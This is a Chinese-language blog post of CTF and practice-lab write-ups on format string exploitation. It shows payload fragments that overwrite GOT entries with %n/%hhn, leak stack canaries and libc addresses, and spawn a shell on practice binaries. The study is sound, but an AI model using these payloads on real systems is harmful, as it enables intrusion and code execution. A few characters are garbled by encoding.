<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="LiveOverflow這一個是看影片趕快做一下筆記，不然我快忘光了ＱＱ
影片：https://www.youtube.com/watch?v=t1LH9D5cuK4
題目：https://exploit.education/protostar/format-four/
先看一下source cod">
    

    <!--Author-->
    
        <meta name="author" content="AStar">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="Format_string_attack"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="AStar&#39;s Blog"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

        <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>Format_string_attack - AStar&#39;s Blog</title>

    <!-- Bootstrap Core CSS -->
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Google Analytics -->
    


    <!-- favicon -->
    
	
</head>


<body>

    <!-- Menu -->
    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">AStar</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
                
                    <li>
                        <a href="/">
                            
                                Home
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/archives">
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/tags">
                            
                                Tags
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/categories">
                            
                                Categories
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="https://github.com/klugjo/hexo-theme-clean-blog">
                            
                                <i class="fa fa-github fa-stack-2x"></i>
                            
                        </a>
                    </li>
                
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>

    <!-- Main Content -->
    <!-- Page Header -->
<!-- Set your background image for this header in your post front-matter: cover -->

<header class="intro-header" style="background-image: url('https://i.imgur.com/mUijvOa.jpg')">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <div class="post-heading">
                    <h1>Format_string_attack</h1>
                    
                    <span class="meta">
                        <!-- Date and Author -->
                        
                        
                            2019-08-01
                        
                    </span>
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">

            <!-- Tags and categories -->
           

            <!-- Gallery -->
            

            <!-- Post Main Content -->
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <h1 id="LiveOverflow"><a href="#LiveOverflow" class="headerlink" title="LiveOverflow"></a>LiveOverflow</h1><p>這一個是看影片趕快做一下筆記，不然我快忘光了ＱＱ</p>
<p>影片：<a href="https://www.youtube.com/watch?v=t1LH9D5cuK4" target="_blank" rel="noopener">https://www.youtube.com/watch?v=t1LH9D5cuK4</a></p>
<p>題目：<a href="https://exploit.education/protostar/format-four/" target="_blank" rel="noopener">https://exploit.education/protostar/format-four/</a></p>
<p>先看一下source code:</p>
<p><img src="/img/Format_string_attack/liveformatstring1.png" alt=""></p>
<p>可以看到他是直接做<code>exit</code>, 並沒有什麼<code>return 0</code>這種的</p>
<p>所以overflow eip這點是不可行的</p>
<p>透過執行可以知道就是一個我們輸入什麼他printf什麼<br><img src="/img/Format_string_attack/liveformatstring_exec1.png" alt=""></p>
<p>但他的printf因為是直接使用<code>printf(buffer)</code>來做輸出<br>因此有format string的弱點，盲測的時候可以試著輸入看看<code>%x</code>或其他printf的關鍵字。<br>只要有像這樣的回應就代表有戲(?</p>
<p><img src="/img/Format_string_attack/liveformatstring_exec2.png" alt=""></p>
<p>一般來說Format string可以透過<code>aaaa%N$x</code>來找offset(x86)，N是任意數，就是透過<code>aaaa%1$x</code> <code>aaaa%2$x</code>…這樣子下去爆破取得offset<br><code>%N</code>是代表第N個參數，<code>$x</code>是以hex的方式輸出，參照<a href="https://en.wikipedia.org/wiki/Printf_format_string" target="_blank" rel="noopener">wiki</a>和<a href="https://www.owasp.org/index.php/Format_string_attack" target="_blank" rel="noopener">owasp</a>:</p>
<pre><code>For example, printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17) produces 17 0x11; 16 0x10.

Below are some format parameters which can be used and their consequences:

•&quot;%x&quot; Read data from the stack

•&quot;%s&quot; Read character strings from the process&apos; memory

•&quot;%n&quot; Write an integer to locations in the process&apos; memory

%d - 輸出十進位整數
%s - 從記憶體中讀取字串
%x - 輸出十六進位整數
%c - 字符 - 输出字符
%p - 指针 - 指针地址
%n - 寫入到目前为止所輸出的字符数
</code></pre><p>但我懶，pwntool可以直接幫我們找到offset</p>
<p><img src="/img/Format_string_attack/liveformatstring2.png" alt=""></p>
<p><img src="/img/Format_string_attack/liveformatstring3.png" alt=""></p>
<p>可看見他的offset是7</p>
<p>知道了這些後，我們要做的就是把vuln裡面的exit的got address改指向hello的address</p>
<p>我們先用gdb改看看，首先先用objdump知道一些address的資訊</p>
<p><img src="/img/Format_string_attack/liveformatstring4.png" alt=""></p>
<p>這樣就知道了hello和vuln的exit@PLT address</p>
<p><img src="/img/Format_string_attack/liveformatstring5.png" alt=""></p>
<p>這樣就有了exit@GOT address了</p>
<p>我們把斷點下在<code>0x8049227</code>讓我們方便改exit@GOT的內容</p>
<pre><code>b *0x8049227
</code></pre><p>之後<code>r</code>它然後隨便輸入之後他會在斷點停下來<br>再對exit@GOT的內容進行更改</p>
<pre><code>set {int}0x804c01c=0x080491a2
</code></pre><p>然後再<code>c</code>它</p>
<p><img src="/img/Format_string_attack/liveformatstring6.png" alt=""></p>
<p>boo! 就會是我們要的結果了，接著我們要不透過gdb達到這件事情</p>
<p>剛剛知道了offset是7，那這個要怎麽利用呢？</p>
<p>我們先嘗試輸入<code>aaaa%7$x</code></p>
<p><img src="/img/Format_string_attack/liveformatstring7.png" alt=""></p>
<p>可以看到<code>0x61616161</code>就是我們剛剛輸入的hex</p>
<p>那我們輸入<code>0x8048000</code>看看呢？</p>
<p><img src="/img/Format_string_attack/liveformatstring8.png" alt=""></p>
<p><img src="/img/Format_string_attack/liveformatstring9.png" alt=""></p>
<p>可以看到他沒有回傳結果，因為<code>0x8048000</code>他會先輸出<code>00800408</code>才會去leak, <code>0x00</code>就是我們熟知的<code>EOF</code>，所以我們要換個方式來leak</p>
<p><img src="/img/Format_string_attack/liveformatstring10.png" alt=""></p>
<p>這樣子就會在leak出<code>0x8048000</code>位子的內容後才會輸出</p>
<p><img src="/img/Format_string_attack/liveformatstring11.png" alt=""></p>
<p>但因為相對位置改了，所以我們需要改一下我們的offset, 因為我們的<code>%7$s</code>是在不包含<code>%7$s</code>這個字串在內的offset</p>
<p>那現在把它放到前面再接address的話就會包含到<code>%7$s</code>這個字串了，所以我們要把offset+1就是這個道理 </p>
<p>這個在需要leak binary的時候算蠻重要的步驟，因為address不可能沒有<code>00</code></p>
<p>都準備好了之後我們要開始改寫exit@GOT的內容了，可以利用<code>%n</code>做到</p>
<p><img src="/img/Format_string_attack/liveformatstring14.png" alt=""></p>
<p>因為這個address沒有<code>00</code>的問題，所以我用<code>%7$n</code>這樣子還是可以的</p>
<p>如果要把address放後面的話就要改成</p>
<pre><code>&quot;aaaa&quot; + &quot;%9$n&quot; + p32(exit_GOT)
</code></pre><p>因為padding包含了”aaaa”和leak的payload, 所以offset要+2</p>
<p>讓我們用gdb trace一次看看</p>
<p><img src="/img/Format_string_attack/liveformatstring12.png" alt=""></p>
<p>看上面的exploit code可以知道我們在輸入前加了一個<code>gdb.attach()</code></p>
<p>這個是用來呼叫gdb hook的code<br>所以現在是輸入前的情況，我先看看exit@GOT的內容，現在的話還是正常的內容</p>
<p><img src="/img/Format_string_attack/liveformatstring13.png" alt=""></p>
<p>繼續讓它跑就crash了，這時候再看exit@GOT就會是0x8, 而eip也停在0x8, 因為PLT會把GOT的內容餵給eip, 這個0x8就是p32(exit_GOT)加上”aaaa”的長度</p>
<p>到這邊我們已經成功改寫exit@GOT<br>現在我們要借助<code>%n</code>把exit@GOT改寫成<code>0x80491a2</code><br>但要在寫入前先輸出<code>0x80481a2</code>個字串顯然是不太可行<br>(%n是把至今為止輸出的字串數量寫入特定address)</p>
<p>我們可以2個bytes 2個bytes寫入, 這樣一次的量就不會那麼多<br>我們首先先寫入後4 bytes比較容易(因為前面都補0就好)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;hello&gt; = 0x080491a2</span><br><span class="line">0x91a2	= 37282</span><br></pre></td></tr></table></figure></p>
<p>但我們的<code>37282</code>還需要扣掉address本身佔的4 bytes<br>所以是<code>37278</code></p>
<p><img src="/img/Format_string_attack/liveformatstring15.png" alt=""></p>
<p>這是一個小技巧，你要輸出37278個a��是可以<code>$x</code>前面加多少數字，他就會輸出多少個空格才輸出hex</p>
<p>我們用gdb trace看看</p>
<p><img src="/img/Format_string_attack/liveformatstring16.png" alt=""></p>
<p>這是輸入前的exit@GOT</p>
<p><img src="/img/Format_string_attack/liveformatstring17.png" alt=""></p>
<p>可以看到我們成功改寫後兩bytes了<br>那要怎麼改寫前兩bytes呢？因為<code>%n</code>的特性，我們只能越寫越大，但前兩個bytes我們要寫入<code>0x0804</code>怎麼辦呢？<br>影片中寫到是可以透過寫入<code>0x10804</code>來達到目的，因為GOT只會吃後兩bytes，我自己猜測寫超過的話有可能會影響到前一個<br>GOT的address，不過這也不影響我們的操作</p>
<p>實作還要再算一下，待我貼圖在慢慢說起</p>
<p><img src="/img/Format_string_attack/liveformatstring18.png" alt=""></p>
<p>第一個位址沒問題吧，然後我們把位址+2來寫高位的前兩個位址<br>這有點難說明，借影片的圖來說</p>
<p><img src="/img/Format_string_attack/liveformatstring19.png" alt=""></p>
<p>我們看過這麼多次的objdump可以知道，一個記憶體位置是存一個byte<br>所以GOT應該也是一個位址存一個bytes, 存了四個bytes,<br>以little endian的方式存</p>
<p>所以我們把address+2就會寫到前兩個位址的數值</p>
<p>再來就是算���學了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x10804=67588</span><br><span class="line">67588-37278-4-4=30302</span><br></pre></td></tr></table></figure>
<p>我們一樣執行用gdb去看</p>
<p><img src="/img/Format_string_attack/liveformatstring20.png" alt=""></p>
<p>這是執行printf前，還是正常的GOT內容</p>
<p><img src="/img/Format_string_attack/liveformatstring21.png" alt=""></p>
<p>可以看到成功被我們更改了</p>
<p><img src="/img/Format_string_attack/liveformatstring22.png" alt=""></p>
<h1 id="craxme"><a href="#craxme" class="headerlink" title="craxme"></a>craxme</h1><p>拿黑坑的例題來練習看看</p>
<p><img src="/img/Format_string_attack/hitconformat.png" alt=""></p>
<p>首先一樣我們要知道他的 offset 是多少</p>
<p><img src="/img/Format_string_attack/hitconformat_1.png" alt=""></p>
<p>然後看一下source code</p>
<p><img src="/img/Format_string_attack/hitconformat_2.png" alt=""></p>
<p>雖然這題是要你改寫 magic 的值來取得flag</p>
<p>但這一題可以取得 shell, 可以直接用一招拿到兩個flag</p>
<p>我們先看一下code</p>
<p><img src="/img/Format_string_attack/hitconformat_3.png" alt=""></p>
<p><img src="/img/Format_string_attack/hitconformat_4.png" alt=""></p>
<p>我們可以將<code>puts</code>的got更改成<code>0x080485a1</code>, 然後將<code>printf</code>的got改寫為<code>system</code>的PLT address</p>
<p>這樣我們只要在<code>read</code>輸入<code>/bin/sh</code>就會被構成 <code>system(&quot;/bin/sh&quot;)</code> 執行</p>
<p>這邊的寫法我研究過一陣子，因為一次寫兩個address, 數字真的不小，算起來燒腦</p>
<p>原本打算是在第二次<code>read</code>的時候再去蓋<code>printf</code>的GOT address (因為我們一定會跳到puts的那個選項，所以我們其實還可以再叫一次<code>read</code>)</p>
<p>但是發現透過puts跳過去的<code>read</code>的 offset 就不會是7了，等於要重找更麻煩，於是我還是認命的一次蓋兩個</p>
<p>跟上面教學如何蓋address一樣，只是它只蓋一個address, 蓋第二個address的話，就變成蓋後兩 bytes 的時候也要多蓋 1 byte 了, 那蓋前兩bytes呢？就變0x20804開頭了</p>
<p>不過我這裡碰到另一個雷點</p>
<p>就是好死不死我的 <code>puts@PLT</code> 下面就是 <code>system@PLT</code> </p>
<p><img src="/img/Format_string_attack/hitconformat_5.png" alt=""></p>
<p>所以造成一個慘劇發生——我在改寫 <code>puts@GOT</code> 的時候蓋到<code>system@GOT</code></p>
<p><img src="/img/Format_string_attack/hitconformat_6.png" alt=""></p>
<p>這時候怎麼辦呢？</p>
<p>在改寫 <code>puts@GOT</code> 的時候用<code>%hn</code>就好了</p>
<p>exploit code:</p>
<p><img src="/img/Format_string_attack/hitconformat_7.png" alt=""></p>
<pre><code>％hn 代表限制寫入的長度為2bytes
%hhn 代表寫入的長度限制為1bytes
</code></pre><p>許多format string attack 的 exploit code 很常看到這種寫法，有些為求精確寫入，會 1 byte 1 byte 的改寫</p>
<h1 id="espr"><a href="#espr" class="headerlink" title="espr"></a>espr</h1><p>影片：<a href="https://www.youtube.com/watch?v=XuzuFUGuQv0" target="_blank" rel="noopener">https://www.youtube.com/watch?v=XuzuFUGuQv0</a><br>題目：<a href="https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/pwn/espr" target="_blank" rel="noopener">https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/pwn/espr</a></p>
<p>這題是很有意思的 Format string attack 的題目，出題隊伍 ESPR 在 HITCON CTF 2017 當導覽員的時候就見過他們，德國一支蠻有名的隊伍，33c3 CTF的題目就���他們出的</p>
<p>這題就是把他們的隊名出成題目</p>
<p>題目只有一張圖片</p>
<p><img src="/img/Format_string_attack/espr_small.jpg" alt=""></p>
<p>為求真實，因此會在以沒拿到ELF的情況下解題</p>
<p>因為從題目看得到 <code>rsp</code> <code>rdi</code>，所以可以判定這題應該是x64的</p>
<p>用 pwntool 幫我算offset</p>
<p><img src="/img/Format_string_attack/esprformatstring_1.png" alt=""></p>
<p>我們要先嘗試它有沒有開PIE, 如果有開就傷腦筋了</p>
<p>如何確認呢？去嘗試他預設的檔頭位址就行了(<code>0x400000</code>)<br>先寫一個<code>leak.py</code></p>
<p><img src="/img/Format_string_attack/esprformatstring_2.png" alt=""></p>
<p>注意前面的padding要補滿8個，我就因為沒補8個一時之間還以為是 offset 算錯</p>
<p><img src="/img/Format_string_attack/esprformatstring_3.png" alt=""></p>
<p>看起來是沒開 PIE 的，這樣就可以準備來leak binary</p>
<p><img src="/img/Format_string_attack/esprformatstring_4.png" alt=""></p>
<p>這邊也要注意一些 exception 的處理</p>
<p>在try那邊我們有針對 <code>EOFError</code> <code>(null)</code> 做例外處理</p>
<p>雖然<code>dump.raw</code>無法執行，但以 leak binary 的角度來說夠了</p>
<p><img src="/img/Format_string_attack/esprformatstring_5.png" alt=""></p>
<p>我們可以用 radare2 更改 function name </p>
<p><img src="/img/Format_string_attack/esprformatstring_6.png" alt=""></p>
<p>整理完後大概是這個樣子：</p>
<p><img src="/img/Format_string_attack/esprformatstring_7.png" alt=""></p>
<p>然後可以進去各個 PLT address 得知這些function的 GOT address</p>
<p>把它加進 exploit code</p>
<p><img src="/img/Format_string_attack/esprformatstring_8.png" alt=""></p>
<p>我們就可以透過 GOT address 去 leak 他的 libc address</p>
<p>但過程中我碰到一個小bug</p>
<p>就是當我用 <code>u64</code> 想把我 recv 回來的 address unpack 的時候一���跳 error 說長度錯誤</p>
<p>因此我用下面的code 進行 debug</p>
<p><img src="/img/Format_string_attack/esprformatstring_9.png" alt=""></p>
<p>結果是…</p>
<p><img src="/img/Format_string_attack/esprformatstring_10.png" alt=""></p>
<p>WTF !? 長度9?</p>
<p>而且raw還出現我沒recv的東西，順便說一下repr很好用，一些無法顯示在 shell 的 ascii 他會幫你轉成字串輸出</p>
<p>好消息是看起來就是固定會出現那些例外的data, 所以我recv那邊做一下調整就可以了</p>
<p><img src="/img/Format_string_attack/esprformatstring_11.png" alt=""></p>
<p><img src="/img/Format_string_attack/esprformatstring_12.png" alt=""></p>
<p>到這裡我們成功得到它 libc 的 address 了<br>我們可以用相同的方法把 <code>sleep</code> 和 <code>gets</code> 的 libc 都 leak 出來<br>但我們如果沒有它的 libc 版本還是不知道 system address 怎麼得到啊<br>這邊我們可以用 <code>libc_database</code> 知道他是哪個版本的libc, 但這邊我們是local端<br>就不做了直接leak libc</p>
<p><img src="/img/Format_string_attack/esprformatstring_13.png" alt=""></p>
<p>現在我們有了一切，但最重要的 overwrite 該怎麼做呢？</p>
<p>要知道雖然是 ASLR, 但各 function 之間的距離沒有變，我們可以藉由我們leak出的address得知 <code>printf</code> 和 <code>system</code> 的間距是 <code>0x13ba0</code> (這個資訊後來覺得其實沒啥用XD)</p>
<p>雖然x64無法讓我們改寫8 bytes的所有內容，但我們也不需要，只需要改寫最後3bytes就夠了</p>
<p>假設system 的位址是 <code>0x7fa1b127a9c0</code><br>我們把 <code>0x7fa1b127a9c0</code> 跟 <code>0xff</code> 做 <code>and</code> 運算<br>這樣我們就可以取得最後 1 byte <code>0xc0</code><br>同理 <code>0x7fa1b127a9c0 &amp; 0xffff00</code> 可以得到 <code>0x27a900</code><br>但我們要寫入的應該是 <code>0x27a9</code> 而不是 <code>0x27a900</code><br>所以我們還需要把 <code>0x27a900 &gt;&gt; 8</code>  來得到 <code>0x27a9</code></p>
<p><code>&gt;&gt; 8</code> 的意思是把數值以二進位形式往右移8位，16進位的話一個數字會由4個0和1組成，要往右移兩個數字的話當然就是移8位了</p>
<p>詳細的介紹可以參考 <a href="&quot;http://www.runoob.com/python/python-operators.html&quot;">這裏</a></p>
<p>我們要做的就是把 <code>printf@GOT</code> 改寫成 <code>system</code> 然後再輸入 <code>/bin/sh</code> 就可以拿到 shell 了</p>
<p>不過要注意一點，與x86不同的是x64一定會遇到 null byte 的問題，剛剛複習了上面的寫法後，因為x64的address不會填滿 8 byte 所以會遇到<code>0x00</code>導致蓋失敗的問題</p>
<p><img src="/img/Format_string_attack/esprformatstring_14.png" alt=""></p>
<p>所以要更改寫法，把 <code>printf@GOT</code>放到最後改寫，變成我前面的寫入位址的 payload 都要蓋滿 8 bytes (神麻煩)</p>
<p>我一樣先嘗試改寫最後 1 byte…. 真的很燒腦</p>
<pre><code>payload = &quot;%&quot;+str(196)&quot;c&quot; + &quot;%8$hhn&quot;+ &quot;%8$sa&quot; + p64(printf_GOT)
</code></pre><p><img src="/img/Format_string_attack/esprformatstring_15.png" alt=""></p>
<p>最後看 write up 發現可以用 ljust 讓 leak 的 padding 固定，就不用在那邊算 offset 多少了</p>
<p><img src="/img/Format_string_attack/esprformatstring_16.png" alt=""></p>
<p>那個 <code>time.sleep(1)</code> 是怕說他還在 sleep 我們就 sendline 了，但其實好像不加也可以（？</p>
<p><img src="/img/Format_string_attack/esprformatstring_17.jpg" alt=""></p>
<p>真….真的累，光 overwrite 就研究了一整天，網路上的 payload 好難懂</p>
<h1 id="Bypass-Stack-canary-amp-NX-amp-ASLR"><a href="#Bypass-Stack-canary-amp-NX-amp-ASLR" class="headerlink" title="Bypass Stack canary &amp; NX &amp; ASLR"></a>Bypass Stack canary &amp; NX &amp; ASLR</h1><p>一直想研究這個很久了，每次都只有口頭聽說 Format string attack 可以 byapss linux 那四個防禦機制，但都沒親身實測過</p>
<p>網路上的資源也很少在說 bypass stack canary, 終於找到<a href="&quot;https://www.ret2rop.com/2018/08/format-string-defeating-stack-canary-nx-aslr-remote.html&quot;">這篇</a></p>
<p>大概介紹一下 stack canary, 這個是 linux 為了防止buffer overflow所做的保護機制<br>他會在<del> rbp 與 return address 之間插入一個隨機值</del> rbp 之前插入一個隨機值<br>只要有人嘗試透過 buffer overflow 修改到這個隨機值，程式就會終止達到保護的目的</p>
<p>我不清楚是不是每���linux都這樣，但我自己 trace 的結果是這樣，順便嘴一下誤導我的文章<br><a href="https://access.redhat.com/blogs/766093/posts/3548631" target="_blank" rel="noopener">https://access.redhat.com/blogs/766093/posts/3548631</a></p>
<p>圖畫錯啦！</p>
<p>source code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void center(void)</span><br><span class="line">&#123;</span><br><span class="line">  char code[128];</span><br><span class="line">  printf(&quot;Enter secret code !\nCode: &quot;);</span><br><span class="line">  gets(code);           //take input</span><br><span class="line">  printf(&quot;Entered Command center with code &gt; %s .\n&quot;,code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char name[64];</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);        //no buffering in stdin and stdout</span><br><span class="line">    setvbuf(stdout, 0, 2, 0);</span><br><span class="line">    memset(name, 0, sizeof(name));      //fill name buffer with null bytes</span><br><span class="line">    printf(&quot;What is your name?\nName: &quot;);</span><br><span class="line">    read(0, name, 64);          //read 64 bytes from stdin(0) to name</span><br><span class="line">    printf(&quot;Hello &quot;); printf(name);</span><br><span class="line">    center();               //call center function</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以往都是貼圖片，用這樣子好像比較好一點</p>
<p>反正跑起來就是這樣</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_1.png" alt=""></p>
<p>看看他的保護機制</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_2.png" alt=""></p>
<p>我們用gdb debug 他看看，首先我們是進入 <code>center</code> 這個 function 進行 overflow 的，所以要先想辦法 leak <code>center</code> 的stack canary的值</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_3.png" alt=""></p>
<p>可以看到其中的 <code>fs:0x28</code> 就是 <code>fs</code> 這個 segment register + 0x28 的記憶體位置得到的 random value</p>
<p><code>fs</code> base address 我們無從得知</p>
<p>我們把斷點下在 <code>center+95</code> 看看 stack canary 的值</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_4.png" alt=""></p>
<p>可以看到 rax 就是 stack canary 的值,這個值與 <code>fs:0x28</code> 是相等的，如果 xor 的結果不為0就代表有 overflow 發生，程式就會 terminated</p>
<p>這邊開始我們來 leak stack canary 的值，因為不是找 leak address 的 offset, 所以 pwntools 幫不了我們</p>
<p>只能手動找 offset, 可以利用 <code>%lx</code> 來找 offset, 一般 leak 只能 leak 4byte, 加一個 <code>l</code> 就是 <code>long</code> 的意思</p>
<p>我們一樣用 gdb 配合我們下斷點</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_5.png" alt=""></p>
<p><img src="/img/Format_string_attack/bypass_formatstring_6.png" alt=""></p>
<p>因為第一個 <code>Name</code> 的輸入有做長度限制，所以可以不用怕蓋到 stack canary 的值放多一點</p>
<p>可以看到我們大概在第15個 <code>%lx|</code> 就可以 leak stack canary</p>
<p>但能 leak stack canary 只能確保我們能進行 overflow 而已</p>
<p>重點是能跳到哪呢？</p>
<p>我們除了能 leak stack canary 以外，還能 leak <code>r8</code> 的值</p>
<p>根據上面參考的連結說 <code>r8</code> 的地址和 libc base 有固定的公差</p>
<p>libc base 可以透過 <code>vmmap</code> 得到</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_7.png" alt=""></p>
<p><code>0x00007ffff7fc2500 - 0x00007ffff7e00000 = 1844480</code></p>
<p>這邊上面的教學寫錯了，他直接拿 <code>r-x</code> 的區段當 libc base</p>
<p>這應該要從 libc 的頭來當 base, 畢竟所有的 offset 都是以 libc 的開頭來算的<br>（ 不然就是他的 libc 特別厲害都沒在切區段的全都可執行 ）</p>
<p>稍微整理一下payload之後就是這個樣子</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_11.png" alt=""></p>
<p><img src="/img/Format_string_attack/bypass_formatstring_11_1.png" alt=""></p>
<p>這樣就得到 libc base address 和 canary 的值了，再來雖然我們前面說可以進行 overflow</p>
<p>但具體上的offset是多少呢？</p>
<p>不能直接用 <code>cyclic</code> 盲蓋，這樣蓋到 stack canary 會直接 crash</p>
<p>因為我們有 ELF 所以直接用 gdb 可以數得出來</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_8.png" alt=""></p>
<p><img src="/img/Format_string_attack/bypass_formatstring_9.png" alt=""></p>
<p>在<code>0x62</code>到 canary 之間的空間就是 buffer 的空間(136)</p>
<p>亦或是可以透過靜態分析得知</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_10.png" alt=""></p>
<p>我們透過 objdump 得知 stack canary 的位置在 <code>rbp-0x8</code> 的地方</p>
<p><code>0x90 - 0x8 = 136</code></p>
<p>他們之間的關係大概是 canary -&gt; rbp address -&gt; ret address (根據看的方向也可能倒過來)</p>
<p>都知道了之後我們就能來進行拿 shell 的動作啦~</p>
<p>直接跳 one gadget 可��省很多力</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_12.png" alt=""></p>
<p>exploit code:</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_13.png" alt=""></p>
<p>簡單來說 payload 的構成是 <code>junk(136) + canary(8) + rbp_junk(8) + ret_address(8)</code></p>
<p>教學多 call <code>setuid(0)</code> 來確保拿到的權限是 root 但我是在kali 就算了。</p>
<h1 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h1><p>這一題是defcamp 2019的題目，邊複習這篇邊解出來了XDD<br>就順便貼上來</p>
<p>checksec:<br><img src="/img/Format_string_attack/defcamp2019_secret_0.png" alt=""></p>
<p>保護幾乎全開，然後有format string 的問題</p>
<p><img src="/img/Format_string_attack/defcamp2019_secret_1.png" alt=""></p>
<p>用r2看一下他,<br><code>main</code> 裡面存在format string的問題，<br><img src="/img/Format_string_attack/defcamp2019_secret_2.png" alt=""><br>並且在 <code>secret</code> 裡面存在overflow的問題<br><img src="/img/Format_string_attack/defcamp2019_secret_3.png" alt=""><br>strcmp下面沒有吐出flag的相關程式碼，意思是就算猜對也不會給你答案，所以我們直接拿shell<br><img src="/img/Format_string_attack/defcamp2019_secret_4.png" alt=""></p>
<p>一樣，因為我們要先找到<code>canary</code>的offset才能進行overflow<br>我們透過輸入<br><code>%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|</code><br>取得canary的value</p>
<p>透過 gdb 可以輕易取得leak canary的offset<br><img src="/img/Format_string_attack/defcamp2019_secret_5.png" alt=""></p>
<p><img src="/img/Format_string_attack/defcamp2019_secret_6.png" alt=""></p>
<p>可以知道大概在第15個offset</p>
<p>那因為有長度限制，我們無法一直leak到16以後，</p>
<p>我們現在至少知道了第15個是canary, 第16個是<code>__libc_csu_init</code>的位置</p>
<p>為什麼知道呢？因為每一次執行他的最後1.5個byte都是<code>c40</code>結尾</p>
<p>符合<code>__libc_csu_init</code>的結尾</p>
<p><img src="/img/Format_string_attack/defcamp2019_secret_7.png" alt=""></p>
<p>這樣我們就能leak出 <code>program base</code> 了</p>
<p>但除了leak <code>program base</code> 還不夠，我們需要能leak libc address</p>
<p>其實找libc address可以透過他的位址特性—無論前面位址怎麼變最後1.5個byte都不會變</p>
<p>看到最後1.5個byte不會變的位址，再用gdb去看他對應的 function 是什麼</p>
<p>理論上來說 format string 是能leak出 stack 的內容，而 main 的return address<br><code>__libc_start_main</code>也會放在stack內，所以基本上都能leak出來</p>
<p>在第17個offset我們就找到 libc 的 address 了</p>
<p>我們輸入 <code>%15$lx %16$lx %17$lx</code> 之後出現了三個 address</p>
